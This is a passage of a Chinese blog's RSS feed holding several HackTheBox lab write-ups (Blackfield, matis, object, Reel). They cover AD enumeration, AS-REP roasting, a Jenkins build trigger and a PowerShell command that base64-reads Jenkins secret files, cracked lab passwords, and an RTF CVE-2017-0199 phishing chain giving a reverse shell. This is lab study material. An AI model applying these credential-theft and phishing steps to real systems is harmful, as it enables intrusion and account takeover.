&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58222552f72ea8805bbf63f007591aec%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看flag&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8e93bca57d16f39f255af6e70fb5c09%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;BloodHound是一款用于域分析的强大工具，它可以帮助安全专业人员识别和分析Active Directory（AD）环境中的攻击路径和权限问题。本文将介绍BloodHound的基本概念，并提供一些使用BloodHound进行域分析的编程实例。&lt;/p&gt;
&lt;p&gt;BloodHound的使用：&lt;/p&gt;
&lt;p&gt;启动：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、开启neo4j数据库：
neo4j start
访问本地的7474端口即可看到web页面，默认账密：neo4j，第一次使用需要修改密码
2、kali启动BloodHound：
./BloodHound --no-sandbox
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;离线脚本使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、上传windows版本的脚本，存放在以下路径：
BloodHound-linux-x64/resources/app/Collectors
2、运行即可
SharpHound.exe -c all
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;玩了半天终于玩儿明白了，原来人家回自动分析路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b4f95d646769f2b0e55d384e6720c30%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X017 blackfield</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x017-blackfield/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x017-blackfield/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEea18669927047071b2f016d741cd9f9cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfc75e9ba6e8d681ccc511c28beec4352image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4a7cc6b9b385446a255fed934430c98dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注服务：ldap\smb\5985&lt;/p&gt;
&lt;p&gt;smb存在匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc7ba8abad6771efef30f690f769ad499image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个文件夹好像是个人文件夹，这些文件名可能是用户名，接着看ldap，没有什么有效信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8f53bc5134ba6e86cf716f47ea2c4d1bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用刚刚smb获取到信息，进行用户名枚举：&lt;/p&gt;
&lt;p&gt;获得可用用户名三个：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa9472104fb02cd43db957d2ff9e59bebimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有了用户名可以尝试AS-REP：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE436a68b5e9c5043a128f88a8f9c59a09image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解成功：&lt;/p&gt;
&lt;p&gt;#00^BlackKnight&lt;/p&gt;
&lt;p&gt;support&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8f7242a56316182305de35d369ef0f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc578c613e35f8b16225d7e65422825e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound.py看看吧：&lt;/p&gt;
&lt;p&gt;但是并没给出什么有用的信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9e3a4f3918f84ebb4a7715cb6438436bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;psexec也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE44c2f715a9111c4b0ce67010f55c0f7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;kerberoasting：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8ba0a51c180c93183dc8450b4f964333image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次查看bloodhound：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87bd2e04203f2c43efbee1eb37d52375image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我们可以修改AUDIT2020用户的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9917a62e8115593d051ae2621dd92d98image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2c928d8e4b93bd01c9d900695b627a78image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现关键内容lsass.zip&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd13f868e7c7adfb3d7f02664f65ae955image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读了一堆hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3a02507e0161c2a105cf0f74dfa07f1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提取出来吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE91e34b8a176e74c2a8b29e4d138fbb13image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用crackmapexec来爆破smb以获取可用hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7ef8dde872b3ece13cc9c59d6ee0738fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound可以知道，这是BACKUP OPERATORS组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06bb8613fc5fb728047558ecb7567c99image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过查找信息，发现以下解释：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7a04b590659e373eebf7fa1592ad9a1eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时还是远程管理组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd305227fb19a6f99cf1090fe281feb4fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X018 matis</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x018-matis/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x018-matis/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3d970b6a64ceb598de9c74b2f94023ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0a3b62c138df63b319e3dff3916bca1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1dbd01021a15c5e120cb0eb10a714b3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：smb\ldap\http\mssql&lt;/p&gt;
&lt;p&gt;smb&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf38b5e691dd72fe96c35f2103d829abaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ldap&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8ab1d1ac0bda3c32a45f81e853ba38a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看8080了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1b155670fd396ef80562714c70a830adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;是两个xss：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE81e7b16c4e1676a9e4102ce64f00e7fdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再看1377：&lt;/p&gt;
&lt;p&gt;打开是默认页面，目录扫描发现：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE582bb4244a55f2c76bf1042a2e0800c2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;管理员名为admin：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd737440b28e8ed71794a1f53a1f9fa36image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;文件名即为密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8c8db80985487890c1077cb6b3b7b38image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc831e0ec4488d069f2d399e09da4b70image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么这个密码，可能是web、sql、ldap的：&lt;/p&gt;
&lt;p&gt;web不行&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE016642942a591e30ef1e0c7a56cb7fb3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ldap没有账户，试试mssql先：&lt;/p&gt;
&lt;p&gt;成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE23c3f86220690713e83de14c2b2f1948image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里几个思路：1、收集数据库里面的数据；2、中继&lt;/p&gt;
&lt;p&gt;中继出来，发现不让用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0c47c4eb493491ef0bcbe77fca1c980image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE169245b6c62c284503376520afca5e2dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第二次进行尝试的时候发现：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1eac2c59199c4587cbfaaf927ed5325image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;xp_cmd也不让用，只能看看敏感信息了：&lt;/p&gt;
&lt;p&gt;和user有关的表就三个，查起来很快：&lt;/p&gt;
&lt;p&gt;james                J@m3s_P@ssW0rd!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEddda5b09f0c922d0aa24c2596f1c07e8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次获得账户名密码，同样的，思路有几个，1、web；2、smb；3、ldap&lt;/p&gt;
&lt;p&gt;smb看来没什么东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8c13136459512adf64739a76e6190a23image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;web也登录失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE52f383acbeb2c8257997bae84fd5ccf3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只剩下ldap了，直接使用bloodhound来看看吧：&lt;/p&gt;
&lt;p&gt;这个用户是可以登录的，但是没有3389和5689开放啊：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6d0ea9fcab56aac87c67e0825c55b75cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像也没有什么好的线路了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd55be7a59456eefba8308b1686795c30image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X019 object</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x019-object/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x019-object/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8a4a5bd06cc5b94d2a4c7a4bb86ab5adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE463dd639cc418cac23c20b51d76fbdffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2bb8b45352e30d415f216ae75dc4ef15image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;2个http，一个winrm：&lt;/p&gt;
&lt;p&gt;80，改一下hosts:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf61552d770e37239b793daad390960aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现Jenkins，但是没有密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0d95232379b880d4f594c14e44e82c81image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;注册一个就好：&lt;/p&gt;
&lt;p&gt;记录一下，这里利用较为复杂：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE18acfef783a02105d50f29b7627cc67eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;选第一个就行，Freestyle&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE341076286b10660bc98b9d81712b8c3fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd24048db8c3264b0df9274339bd7d30fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9d8b32a4cb933cf5a8507940245f2aa7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd6fb38b188e5c54e893655c43ea7a214image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后就可以发现cxk2创建好了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5989113e37e3e91230705d5e9706515fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取一个token:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE292e7d59d2112195f79b429607e33003image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;添加一个项目：&lt;/p&gt;
&lt;p&gt;curl &lt;a href=&#34;http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk&#34;&gt;http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf4ddae0037f9c4e6abf55c49acb44dafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后点进去就可以看到输出了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75afbb54e1a84516be5f44eb8ae040d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接下里就是命令执行：&lt;/p&gt;
&lt;p&gt;失败了，好像是说网络错误：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3cbf0a230caceaa0e8e7e2ffc70e134image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里涉及知识盲区：&lt;/p&gt;
&lt;p&gt;jenkins的用户信息存放位置：&lt;/p&gt;
&lt;p&gt;c:\Users\oliver\Appdata\local\jenkins.jenkins\users&lt;/p&gt;
&lt;p&gt;然后可以看到admin用户的文件夹：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE62acc9d58da7e28c97ddba278c03bccaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读取里面的config.xml文件：&lt;/p&gt;
&lt;p&gt;就可以看到加密的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5894a52362dc6d332dfc3bc3c0a7a3cbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;详情可以参见：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/hoto/jenkins-credentials-decryptor&#34;&gt;https://github.com/hoto/jenkins-credentials-decryptor&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上面那个文件，其实是&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcf27eed06a4e20c411325bb133328d47image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;master.key:&lt;/p&gt;
&lt;p&gt;f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc05251d5c94adab59ea51a062aa689ccimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;hudson.util.Secret是二进制文件，使用base64读取出来：&lt;/p&gt;
&lt;p&gt;powershell.exe -c &amp;ldquo;$c=[convert]::ToBase64String((Get-Content -path &amp;lsquo;c:\Users\oliver\Appdata\local\jenkins.jenkins\secrets\hudson.util.Secret&amp;rsquo; -Encoding byte));Write-Output $c&amp;rdquo;&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X020 Reel</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x020-reel/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x020-reel/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb5ad5902eaed1cba670f021c3c57b41eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf16cd19536cd0d56229a8932c3f7ae8dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE507c1c6553aaf03d2f202216cec5e25aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：ftp\ssh\smb&lt;/p&gt;
&lt;p&gt;先看ftp:&lt;/p&gt;
&lt;p&gt;有匿名登录，发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc1d9c2f6a55ae6070924f9978eb027a4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;里面的信息大致理解为：&lt;/p&gt;
&lt;p&gt;有程序回记录hash，然后上传到documents下的文件将会被查看，然后是操作记录？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEebd586d457654b21f2bce6d856aaa0c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3c6f18499bb0b6b6ee076a6daddc9565image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ssh目前没有其他信息，就不查看了，研究一下上面写的rtf格式的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0a2bca99e6897513ee294a0de8e21d5dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;了解了一下，RTF格式的文档也能调用宏来进行攻击：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/bhdresh/CVE-2017-0199&#34;&gt;https://github.com/bhdresh/CVE-2017-0199&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd90abd08c5b1adac77be6fdef6f6c4b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里的意思是，可以让rtf格式的文档来下载HTA文件执行，hta再进行上线，然后发现前面理解好像有些问题&lt;/p&gt;
&lt;p&gt;FTP并没有上传权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0ea5c66efa52b80eaf7d75214eb43870image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;呐意思其实是向文件创建人的邮箱发信息：&lt;/p&gt;
&lt;p&gt;因为25端口开放的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6b042694b831f21a63b58fce782e675dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;配置Empire，生成hta：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcde94f4bf5107a8e9e9dec93509e6fd9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发送邮件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa71e39f5b5e4387ed9f3b6c3049c4a7cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcc8fd18eea6201ec71b8dc75fd4e841fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba70200d15c647d2d6da1052cfa5eba8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;别的不谈，这玩意儿，延迟是真的高：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE432ff945dd6abe46fc753eea5f84b0a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;当前在域内：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe3dbfd5a3293d8e8d09af062bd6158f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上bloodhound把：&lt;/p&gt;
&lt;p&gt;不让用：&lt;/p&gt;
